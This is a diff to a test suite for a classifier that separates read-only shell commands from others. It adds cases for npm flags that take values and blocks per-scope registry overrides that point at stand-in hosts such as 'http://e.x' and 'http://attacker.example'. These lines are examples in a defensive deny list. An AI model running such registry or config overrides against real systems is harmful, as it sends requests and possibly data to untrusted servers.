@@ -169,6 +169,7 @@ describe("read-only Bash classifier", () => {
       "npm audit fix",
       "npm audit fix --force",
       "npm audit --audit-level high", // separated flag value fails closed
+      "npm audit --omit dev", // separated flag value fails closed (any value-taking flag, not just --audit-level)
       // Unknown/future npm subcommand: the allowlist is positive, so an
       // unenumerated verb stays unclassified rather than assumed safe.
       "npm some-future-verb",
@@ -204,8 +205,24 @@ describe("read-only Bash classifier", () => {
       "npm ls --registry=http://attacker.example",
       "npm view lodash --userconfig=/tmp/evil.npmrc",
       "npm outdated --globalconfig=/tmp/evil.npmrc",
+      // Per-scope registry override: npm resolves a scoped package's
+      // registry from `@scope:registry` before the plain `registry` config,
+      // so this is an equally live exfiltration vector, not merely a
+      // naming variant of the bare --registry flag above.
+      "npm view lodash --@scope:registry=http://e.x",
+      "npm audit --@myorg:registry=http://e.x",
+      "npm audit --@myorg:registry http://e.x",
     ])("blocks %s (untrusted registry/config source flag)", (cmd) => {
       expect(isReadOnlyBashCommand(cmd)).toBe(false);
+    });
+
+    it("floors `npm audit -fix` deliberately: verified npm behavior is a parse error, not the mutating fix arm", () => {
+      // Single dash, not the `fix` subcommand or a recognized flag cluster.
+      // Verified npm 11.17.0 behavior: `Unknown cli config "--fix"`, and npm
+      // falls back to the plain read-only report — it does NOT run
+      // `npm audit fix`. `startsWith("-")` correctly floors this; do not
+      // "fix" it into a block without re-verifying npm's parser first.
+      expect(isReadOnlyBashCommand("npm audit -fix")).toBe(true);
     });
   });
 
